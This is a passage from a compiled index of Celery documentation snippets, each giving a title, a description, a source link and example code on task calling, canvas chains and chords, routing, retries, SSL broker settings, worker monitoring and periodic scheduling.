https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_48\n\nLANGUAGE: pycon\nCODE:\n```\n>>> result = job.apply_async()\n\n>>> result.ready()  # have all subtasks completed?\nTrue\n>>> result.successful() # were all subtasks successful?\nTrue\n>>> result.get()\n[4, 8, 16, 32, 64]\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Result Handling\nDESCRIPTION: Example of configuring tasks to ignore results for better performance and resource usage.\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n@app.task(ignore_result=True)\ndef mytask():\n    pass\n\nclass MyTask(Task):\n    ignore_result = True\n```\n\n----------------------------------------\n\nTITLE: Implementing Time Limits with Exception Handling in Celery\nDESCRIPTION: Example showing how to catch the SoftTimeLimitExceeded exception to cleanly handle task termination before the hard time limit is reached.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\nfrom myapp import app\nfrom celery.exceptions import SoftTimeLimitExceeded\n\n@app.task\ndef mytask():\n    try:\n        do_work()\n    except SoftTimeLimitExceeded:\n        clean_up_in_a_hurry()\n```\n\n----------------------------------------\n\nTITLE: Defining Task Router Function\nDESCRIPTION: Shows how to define a function-based task router using the new task_routes setting. This router assigns the 'add' task to a high-priority queue.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\ndef route_for_task(name, args, kwargs, options, task=None, **kwargs):\n    from proj import tasks\n\n    if name == tasks.add.name:\n        return {'queue': 'hipri'}\n```\n\n----------------------------------------\n\nTITLE: Getting Currently Executing Tasks\nDESCRIPTION: Python code to retrieve currently executing tasks from workers using the inspect interface. Shows how to get details about tasks currently being processed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_35\n\nLANGUAGE: pycon\nCODE:\n```\n>>> i.active()\n[{'worker1.example.com':\n    [{'name': 'tasks.sleeptask',\n      'id': '32666e9b-809c-41fa-8e93-5ae0c80afbbf',\n      'args': '(8,)',\n      'kwargs': '{}'}]}]\n```\n\n----------------------------------------\n\nTITLE: Sample Celery Configuration Module in Python\nDESCRIPTION: Represents a typical external Python module used as a configuration source for Celery apps. Contains settings such as enable_utc and timezone as module-level attributes, which will override app defaults when loaded. Must be importable by Python and referenced correctly in app.config_from_object.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nenable_utc = True\ntimezone = 'Europe/London'\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL for AMQP Broker Connection in Python\nDESCRIPTION: This snippet demonstrates how to configure SSL settings for a broker connection using the 'broker_use_ssl' option. It includes settings for client certificates and server certificate validation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_47\n\nLANGUAGE: python\nCODE:\n```\nimport ssl\n\nbroker_use_ssl = {\n  'keyfile': '/var/ssl/private/worker-key.pem',\n  'certfile': '/var/ssl/amqp-server-cert.pem',\n  'ca_certs': '/var/ssl/myca.pem',\n  'cert_reqs': ssl.CERT_REQUIRED\n}\n```\n\n----------------------------------------\n\nTITLE: Using Pipe Operator for Celery Task Chains in Python\nDESCRIPTION: Illustrates using the pipe operator (`|`) as a more concise syntax for creating a Celery task chain. This achieves the same sequential execution as using `celery.chain`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_25\n\nLANGUAGE: pycon\nCODE:\n```\n>>> (add.s(2, 2) | add.s(4) | add.s(8))().get()\n16\n```\n\n----------------------------------------\n\nTITLE: Implementing Chord with Error Callbacks in Python\nDESCRIPTION: Demonstrates how to create a chord with failing tasks and error callbacks, showing how the chord_join_propagates header failures flag affects error propagation behavior.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nheader = group([failingT1, failingT2])\nbody = t3\nc = chord(header, body)\nc.link_error(error_callback_sig)\n```\n\n----------------------------------------\n\nTITLE: Task Callback Pattern in Celery\nDESCRIPTION: Demonstrates how to implement task callbacks by chaining multiple tasks together\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.utils.log import get_task_logger\n\nlogger = get_task_logger(__name__)\n\n@app.task\ndef add(x, y):\n    return x + y\n\n@app.task(ignore_result=True)\ndef log_result(result):\n    logger.info(\"log_result got: %r\", result)\n```\n\n----------------------------------------\n\nTITLE: Implementing Manual Exception Handling for Retries in Celery\nDESCRIPTION: Example of a Celery task with manual exception handling for retries, equivalent to using the autoretry_for parameter. This approach gives more control over the retry logic but requires more code than the decorator-based approach.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef refresh_timeline(user):\n    try:\n        twitter.refresh_timeline(user)\n    except FailWhaleError as exc:\n        raise refresh_timeline.retry(exc=exc, max_retries=5)\n```\n\n----------------------------------------\n\nTITLE: Batch Updating Celery App Configuration in Python\nDESCRIPTION: Demonstrates updating multiple configuration keys at once with the update method on the conf attribute. This is useful for programmatic configuration management, especially when loading or switching configuration contexts. Dependencies: an initialized Celery app object. Accepts multiple keyword arguments such as enable_utc and timezone; immediately applies them to the app config.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> app.conf.update(\n...     enable_utc=True,\n...     timezone='Europe/London',\n...)\n```\n\n----------------------------------------\n\nTITLE: Defining Session-Scoped Celery Configuration via celery_config Fixture\nDESCRIPTION: Example of defining the `celery_config` pytest fixture with session scope. This fixture returns a dictionary used to configure the test Celery app instance provided by the `celery_app` and `celery_session_app` fixtures. Here, it sets the broker URL and result backend.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef celery_config():\n    return {\n        'broker_url': 'amqp://',\n        'result_backend': 'rpc',\n    }\n```\n\n----------------------------------------\n\nTITLE: Basic Task Invocation Examples\nDESCRIPTION: Demonstrates different ways to call Celery tasks using delay() and apply_async() methods.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> from proj.tasks import add\n\n>>> add.delay(2, 2)\n\n>>> add.apply_async((2, 2))\n\n>>> add.apply_async((2, 2), queue='lopri', countdown=10)\n\n>>> add(2, 2)\n4\n```\n\n----------------------------------------\n\nTITLE: Adding Callbacks to Celery Tasks using link in Python\nDESCRIPTION: Demonstrates how to add a callback task (`other_task.s()`) to be executed after the successful completion of a parent task (`add.apply_async((2, 2), ...)`). The callback is specified using the `link` argument to `apply_async`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_18\n\nLANGUAGE: pycon\nCODE:\n```\nadd.apply_async((2, 2), link=other_task.s())\n```\n\n----------------------------------------\n\nTITLE: Customizing Worker Setup Using celeryd_after_setup Signal in Celery (Python)\nDESCRIPTION: This snippet shows how to connect a handler to the celeryd_after_setup signal to customize a worker during its setup phase in Celery. The setup_direct_queue function uses the sender (the node name of the worker) to create a unique direct queue for the worker and registers it via app.amqp.queues.select_add. Required dependencies are Celery and a custom worker process; the function receives sender and instance arguments, and can modify the worker before it starts processing tasks. This pattern is suitable for enforcing custom queue topologies or worker-specific setup logic.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/signals.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.signals import celeryd_after_setup\n\n@celeryd_after_setup.connect\ndef setup_direct_queue(sender, instance, **kwargs):\n    queue_name = '{0}.dq'.format(sender)  # sender is the nodename of the worker\n    instance.app.amqp.queues.select_add(queue_name)\n\n```\n\n----------------------------------------\n\nTITLE: Linking Celery Task Error Callback in Python\nDESCRIPTION: Provides an example of attaching an error handling task via the link_error option to an apply_async call, so the error handler is triggered on failure. The error_handler must be a registered Celery task and supports advanced monitoring or reporting workflows.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nadd.apply_async((2, 2), link_error=error_handler.s())\n```\n\n----------------------------------------\n\nTITLE: Group Callbacks and Error Handling in Celery Python\nDESCRIPTION: Illustrates the behavior of group callbacks and error handling in Celery, including potential pitfalls and best practices.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_46\n\nLANGUAGE: python\nCODE:\n```\n>>> g = group(add.s(2, 2), add.s(4, 4))\n>>> g.link(add.s())\n>>> res = g()\n[4, 8]\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> g = group(fail.s(), fail.s())\n>>> g.link_error(log_error.s())\n>>> res = g()\n```\n\n----------------------------------------\n\nTITLE: Setting Broker Transport Options for Visibility Timeout in Python\nDESCRIPTION: This example shows how to set the visibility timeout for Redis and SQS transports using the 'broker_transport_options' setting.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_48\n\nLANGUAGE: python\nCODE:\n```\nbroker_transport_options = {'visibility_timeout': 18000}  # 5 hours\n```\n\n----------------------------------------\n\nTITLE: Manual Task Registration Example\nDESCRIPTION: Example of manually registering a class-based task in Celery 4.0\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nclass CustomTask(Task):\n    def run(self):\n        print('running')\nCustomTask = app.register_task(CustomTask())\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Task ID in Celery\nDESCRIPTION: Shows how to specify a custom task ID when launching a Celery task using apply_async\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n>>> task.apply_async(args, kwargs, task_id='…')\n```\n\n----------------------------------------\n\nTITLE: Running RabbitMQ with Docker\nDESCRIPTION: Docker command to run RabbitMQ message broker in a container, exposing port 5672.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ docker run -d -p 5672:5672 rabbitmq\n```\n\n----------------------------------------\n\nTITLE: Broadcasting Celery Control Commands to Specific Workers (Python)\nDESCRIPTION: Shows how to send a remote control command ('rate_limit') to a specific list of workers using the `destination` argument in `app.control.broadcast`. This example targets only 'worker1@example.com'. The `reply=True` argument ensures the client waits for and collects the reply from the targeted worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\n>>> app.control.broadcast('rate_limit', {\n...     'task_name': 'myapp.mytask',\n...     'rate_limit': '200/m'}, reply=True,\n...                             destination=['worker1@example.com'])\n[{'worker1.example.com': 'New rate limit set successfully'}]\n```\n\n----------------------------------------\n\nTITLE: Getting Worker Statistics via Command Line\nDESCRIPTION: Command to get detailed statistics from workers using the celery inspect interface. This provides comprehensive information about worker performance and state.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_38\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect stats\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Routes with Patterns in Celery Python\nDESCRIPTION: Example showing how to configure task_routes with different routing patterns including direct queue names, glob patterns, regex patterns, and detailed routing options.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_38\n\nLANGUAGE: python\nCODE:\n```\ntask_routes = {\n    'celery.ping': 'default',\n    'mytasks.add': 'cpu-bound',\n    'feed.tasks.*': 'feeds',                           # <-- glob pattern\n    re.compile(r'(image|video)\\.tasks\\..*'): 'media',  # <-- regex\n    'video.encode': {\n        'queue': 'video',\n        'exchange': 'media',\n        'routing_key': 'media.video.encode',\n    },\n}\n\ntask_routes = ('myapp.tasks.route_task', {'celery.ping': 'default'})\n```\n\n----------------------------------------\n\nTITLE: Proper Implementation of after_return with Chords in Celery\nDESCRIPTION: Shows how to properly override the Task.after_return method when using chords with Redis, ensuring the chord callback is applied by calling the super method.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_59\n\nLANGUAGE: python\nCODE:\n```\ndef after_return(self, *args, **kwargs):\n    do_something()\n    super().after_return(*args, **kwargs)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Task Results by ID\nDESCRIPTION: Code examples showing how to retrieve task results using AsyncResult with both task-specific and application-wide approaches.\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_3\n\nLANGUAGE: pycon\nCODE:\n```\n>>> result = my_task.AsyncResult(task_id)\n>>> result.get()\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> result = app.AsyncResult(task_id)\n>>> result.get()\n```\n\n----------------------------------------\n\nTITLE: Pydantic Integration Example in Celery Tasks\nDESCRIPTION: Demonstrates how to use Pydantic models with Celery tasks for data validation and serialization. Shows model definition and task implementation with type hints.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-5.5.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom pydantic import BaseModel\nfrom celery import Celery\n\napp = Celery('tasks')\n\nclass ArgModel(BaseModel):\n    value: int\n\nclass ReturnModel(BaseModel):\n    value: str\n\n@app.task(pydantic=True)\ndef x(arg: ArgModel) -> ReturnModel:\n    # args/kwargs type hinted as Pydantic model will be converted\n    assert isinstance(arg, ArgModel)\n\n    # The returned model will be converted to a dict automatically\n    return ReturnModel(value=f\"example: {arg.value}\")\n```\n\n----------------------------------------\n\nTITLE: Using Partial Celery Signatures with Options in Python\nDESCRIPTION: Shows that execution options provided when calling `apply_async` on a signature are merged with the signature's existing options. New options (like `countdown=1`) override the original options (`countdown=10`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_13\n\nLANGUAGE: pycon\nCODE:\n```\n>>> s = add.signature((2, 2), countdown=10)\n>>> s.apply_async(countdown=1)  # countdown is now 1\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis SSL Connection String in Celery\nDESCRIPTION: Example of Redis connection string with SSL configuration options including certificate requirements, CA certificates path, server certificate path, and private key path.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_22\n\nLANGUAGE: plaintext\nCODE:\n```\nssl_cert_reqs=required\\\n&ssl_ca_certs=%2Fvar%2Fssl%2Fmyca.pem\\                  # /var/ssl/myca.pem\n&ssl_certfile=%2Fvar%2Fssl%2Fredis-server-cert.pem\\     # /var/ssl/redis-server-cert.pem\n&ssl_keyfile=%2Fvar%2Fssl%2Fprivate%2Fworker-key.pem'   # /var/ssl/private/worker-key.pem\n```\n\n----------------------------------------\n\nTITLE: Handling Errors in Celery Chords\nDESCRIPTION: Shows how errors are handled in chords when one task fails, demonstrating the ChordError exception and how to attach an errback to handle failures.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_54\n\nLANGUAGE: pycon\nCODE:\n```\n>>> c = chord([add.s(4, 4), raising_task.s(), add.s(8, 8)])\n>>> result = c()\n>>> result.get()\n```\n\n----------------------------------------\n\nTITLE: Implementing Singleton Celery Task Execution with Memcached Lock in Python\nDESCRIPTION: This Python code defines a Celery task `import_feed` that ensures only one instance runs concurrently for the same `feed_url`. It utilizes a `memcache_lock` context manager which leverages `django.core.cache.add` for atomic locking, requiring a cache backend like memcached where `.add` is atomic. The lock key is derived from the task name and an MD5 hash of the feed URL, with a predefined expiration (`LOCK_EXPIRE`). Dependencies include `celery`, `django.core.cache`, and an assumed `djangofeeds.models.Feed` model.\nSOURCE: https://github.com/celery/celery/blob/main/docs/tutorials/task-cookbook.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport time\nfrom celery import task\nfrom celery.utils.log import get_task_logger\nfrom contextlib import contextmanager\nfrom django.core.cache import cache\nfrom hashlib import md5\nfrom djangofeeds.models import Feed\n\nlogger = get_task_logger(__name__)\n\nLOCK_EXPIRE = 60 * 10  # Lock expires in 10 minutes\n\n@contextmanager\ndef memcache_lock(lock_id, oid):\n    timeout_at = time.monotonic() + LOCK_EXPIRE - 3\n    # cache.add fails if the key already exists\n    status = cache.add(lock_id, oid, LOCK_EXPIRE)\n    try:\n        yield status\n    finally:\n        # memcache delete is very slow, but we have to use it to take\n        # advantage of using add() for atomic locking\n        if time.monotonic() < timeout_at and status:\n            # don't release the lock if we exceeded the timeout\n            # to lessen the chance of releasing an expired lock\n            # owned by someone else\n            # also don't release the lock if we didn't acquire it\n            cache.delete(lock_id)\n\n@task(bind=True)\ndef import_feed(self, feed_url):\n    # The cache key consists of the task name and the MD5 digest\n    # of the feed URL.\n    feed_url_hexdigest = md5(feed_url).hexdigest()\n    lock_id = '{0}-lock-{1}'.format(self.name, feed_url_hexdigest)\n    logger.debug('Importing feed: %s', feed_url)\n    with memcache_lock(lock_id, self.app.oid) as acquired:\n        if acquired:\n            return Feed.objects.import_feed(feed_url).url\n    logger.debug(\n        'Feed %s is already being imported by another worker', feed_url)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Celery Task Result\nDESCRIPTION: Fetches and displays the result of a specific Celery task identified by its UUID. Requires the Celery application instance (`-A proj`), task name (`-t tasks.add`), and the task ID.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_3\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj result -t tasks.add 4e196aa4-0141-4601-8138-7aa33db0f577\n```\n\n----------------------------------------\n\nTITLE: Real-time Celery Event Processing (Python)\nDESCRIPTION: Example of how to process Celery events in real-time using an event consumer, handlers, and state management.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_34\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\n\ndef my_monitor(app):\n    state = app.events.State()\n\n    def announce_failed_tasks(event):\n        state.event(event)\n        # task name is sent only with -received event, and state\n        # will keep track of this for us.\n        task = state.tasks.get(event['uuid'])\n\n        print('TASK FAILED: %s[%s] %s' % (\n            task.name, task.uuid, task.info(),))\n\n    with app.connection() as connection:\n        recv = app.events.Receiver(connection, handlers={\n                'task-failed': announce_failed_tasks,\n                '*': state.event,\n        })\n        recv.capture(limit=None, timeout=None, wakeup=True)\n\nif __name__ == '__main__':\n    app = Celery(broker='amqp://guest@localhost//')\n    my_monitor(app)\n```\n\n----------------------------------------\n\nTITLE: Calling Celery Task with Delay Method in Python\nDESCRIPTION: Demonstrates usage of the delay shortcut on a Celery task instance to send a task message with both positional and keyword arguments. This requires an existing Celery application instance where 'task' is a registered task. Inputs are provided directly as function arguments and output is a task message routed to a worker for async execution. No advanced execution options are supported using delay.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\ntask.delay(arg1, arg2, kwarg1='x', kwarg2='y')\n```\n\n----------------------------------------\n\nTITLE: Handling Task Errors in Celery (Python)\nDESCRIPTION: Shows how to handle task errors by disabling error propagation and checking task state and success status.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_7\n\nLANGUAGE: pycon\nCODE:\n```\n>>> res.get(propagate=False)\nTypeError(\"unsupported operand type(s) for +: 'int' and 'str'\")\n\n>>> res.failed()\nTrue\n\n>>> res.successful()\nFalse\n\n>>> res.state\n'FAILURE'\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Task Class in Celery\nDESCRIPTION: Shows how to create a custom task class by inheriting from celery.Task and overriding the __call__ method.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Task\n\nclass DebugTask(Task):\n\n    def __call__(self, *args, **kwargs):\n        print('TASK STARTING: {0.name}[{0.request.id}]'.format(self))\n        return self.run(*args, **kwargs)\n```\n\n----------------------------------------\n\nTITLE: Scheduling Celery Task During Specific Weeks of the Month using Crontab\nDESCRIPTION: This Python snippet configures a Celery task with `celery.schedules.crontab` to execute at midnight (00:00) on days belonging to the first week (days 1-7) and the third week (days 15-21) of every month.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\ncrontab(0, 0, day_of_month='1-7,15-21')\n```\n\n----------------------------------------\n\nTITLE: Task Queues and Routes Integration Example in Celery Python\nDESCRIPTION: Example showing how task_queues and task_routes settings work together, with task_routes having precedence.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_42\n\nLANGUAGE: python\nCODE:\n```\ntask_queues = {\n    'cpubound': {\n        'exchange': 'cpubound',\n        'routing_key': 'cpubound',\n    },\n}\n\ntask_routes = {\n    'tasks.add': {\n        'queue': 'cpubound',\n        'routing_key': 'tasks.add',\n        'serializer': 'json',\n    },\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Immutable Chord in Celery Python\nDESCRIPTION: Shows how to create an immutable chord where the return value of the group isn't passed to the callback. Uses the .si() method to create immutable signatures.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_32\n\nLANGUAGE: python\nCODE:\n```\n>>> chord((import_contact.s(c) for c in contacts),\n...       notify_complete.si(import_id)).apply_async()\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery with Django Settings\nDESCRIPTION: Configures Celery to use Django settings by explicitly integrating with Django's configuration system\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\napp.config_from_object('django.conf:settings')\n```\n\n----------------------------------------\n\nTITLE: Breaking Down Chord Expression in Celery\nDESCRIPTION: Explains the components of a chord by breaking it down into callback, header, and result operations to show how the tasks are organized and executed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_53\n\nLANGUAGE: pycon\nCODE:\n```\n>>> callback = tsum.s()\n>>> header = [add.s(i, i) for i in range(100)]\n>>> result = chord(header)(callback)\n>>> result.get()\n9900\n```\n\n----------------------------------------\n\nTITLE: Executing Multiple Celery Tasks Concurrently using Group\nDESCRIPTION: Python code showing how to run multiple `urlopen` tasks concurrently for a list of URLs. It uses `celery.group` with a generator expression to create a group of task signatures (`urlopen.s(url)`). The group is executed asynchronously using `.apply_async()`, and results are processed as they arrive using `result.iter_native()`.\nSOURCE: https://github.com/celery/celery/blob/main/examples/eventlet/README.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n$ cd examples/eventlet\n$ python\n>>> from tasks import urlopen\n>>> from celery import group\n>>> result = group(urlopen.s(url)\n...                     for url in LIST_OF_URLS).apply_async()\n>>> for incoming_result in result.iter_native():\n...     print(incoming_result)\n```\n\n----------------------------------------\n\nTITLE: Defining and Registering a Celery Task Using a Decorator in Python Interactive Shell\nDESCRIPTION: Shows how to define a new task using the @app.task decorator and verify its registration within the Celery application. Dependencies: a Celery application object must be created beforehand. Task parameters x and y are received and summed. Also demonstrates accessing the task name and registry entry for introspection or debugging. Output reflects the fully-qualified name derived from the current module context.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_1\n\nLANGUAGE: pycon\nCODE:\n```\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n>>> add\n<@task: __main__.add>\n\n>>> add.name\n__main__.add\n\n>>> app.tasks['__main__.add']\n<@task: __main__.add>\n```\n\n----------------------------------------\n\nTITLE: Setting Celery Task Rate Limits in Python Configuration\nDESCRIPTION: This snippet demonstrates how to set a rate limit for a specific task using the task_annotations setting in the Celery configuration file.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\ntask_annotations = {\n    'tasks.add': {'rate_limit': '10/m'}\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Tasks with Celery Decorator in Python\nDESCRIPTION: Shows how to create a task using the Celery app decorator.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Attaching Error Callback to Celery Chord\nDESCRIPTION: Demonstrates how to attach the error callback to a chord to handle failures in any part of the chord execution.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_56\n\nLANGUAGE: pycon\nCODE:\n```\n>>> c = (group(add.s(i, i) for i in range(10)) |\n...      tsum.s().on_error(on_chord_error.s())).delay()\n```\n\n----------------------------------------\n\nTITLE: Task Auto-Retry Decorator Usage in Celery - Python\nDESCRIPTION: Showcases the use of the 'autoretry_for' argument in the Celery task decorator to automatically retry execution when specific exceptions are raised. The snippet configures a task that retries invocation on 'FailWhaleError' from the 'twitter.exceptions' package. Requires Celery and the referenced exception, and is typical for robust error-handling scenarios where transient errors may occur.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nfrom twitter.exceptions import FailWhaleError\\n\\n@app.task(autoretry_for=(FailWhaleError,))\\ndef refresh_timeline(user):\\n    return twitter.refresh_timeline(user)\n```\n\n----------------------------------------\n\nTITLE: Implementing Chord Unlock Task in Celery\nDESCRIPTION: Shows an example implementation of the unlock_chord task used for chord synchronization, which polls for group completion and calls the callback when ready.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_58\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import maybe_signature\n\n@app.task(bind=True)\ndef unlock_chord(self, group, callback, interval=1, max_retries=None):\n    if group.ready():\n        return maybe_signature(callback).delay(group.join())\n    raise self.retry(countdown=interval, max_retries=max_retries)\n```\n\n----------------------------------------\n\nTITLE: Linking Tasks in Celery Python\nDESCRIPTION: Shows how to link tasks together, where a linked task is called when the parent task returns successfully. The result of the parent task is passed as the first argument to the linked task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_37\n\nLANGUAGE: python\nCODE:\n```\n>>> res = add.apply_async((2, 2), link=mul.s(16))\n>>> res.get()\n4\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Application Timezone (Python)\nDESCRIPTION: Sets the timezone for the Celery application instance (`app`) using the `app.conf.timezone` configuration setting. Although Celery uses UTC internally, this setting defines the local timezone for workers (e.g., for countdowns). Requires a valid Olson timezone database string like 'Europe/London'.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\napp.conf.timezone = 'Europe/London'\n```\n\n----------------------------------------\n\nTITLE: Enabling gevent Worker Pool in Celery (Console)\nDESCRIPTION: This command starts a Celery worker for the specified project (`proj`) using the `gevent` pool for concurrency, as indicated by the `-P gevent` option. The `-c 1000` argument sets the concurrency level, allowing the worker to handle up to 1000 tasks concurrently using gevent's greenlets. This setup is suitable for I/O-bound tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/concurrency/gevent.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -P gevent -c 1000\n```\n\n----------------------------------------\n\nTITLE: Resetting Last Run for All Periodic Tasks in Django-Celery via Console\nDESCRIPTION: The following snippets show how to reset the `last_run_at` attribute for all periodic tasks in a Django project using the Django shell, with support for both the legacy `djcelery` package (Celery 4.0 and below) and `django_celery_beat` (Celery 4.0+). This is required after changing time zone settings because database schedulers do not automatically reset. These commands must be executed inside a Django shell where the corresponding models are available.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ python manage.py shell\n>>> from djcelery.models import PeriodicTask\n>>> PeriodicTask.objects.update(last_run_at=None)\n```\n\nLANGUAGE: console\nCODE:\n```\n$ python manage.py shell\n>>> from django_celery_beat.models import PeriodicTask\n>>> PeriodicTask.objects.update(last_run_at=None)\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery with RPC Result Backend\nDESCRIPTION: Python code to configure Celery application with RPC result backend, allowing task results to be retrieved.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\napp = Celery('tasks', backend='rpc://', broker='pyamqp://')\n```\n\n----------------------------------------\n\nTITLE: Using Crontab Schedules for Periodic Task Execution in Celery (Python)\nDESCRIPTION: This snippet exemplifies configuring a periodic task using a `crontab` schedule expression in Celery's application configuration. The `schedule` field is set to execute a task every Monday morning at 7:30 a.m. The `args` tuple specifies the parameters to the task. The `crontab` helper from `celery.schedules` must be imported. This approach requires Celery to be set up and initialized, and is suitable for more complex scheduling requirements.\nSOURCE: 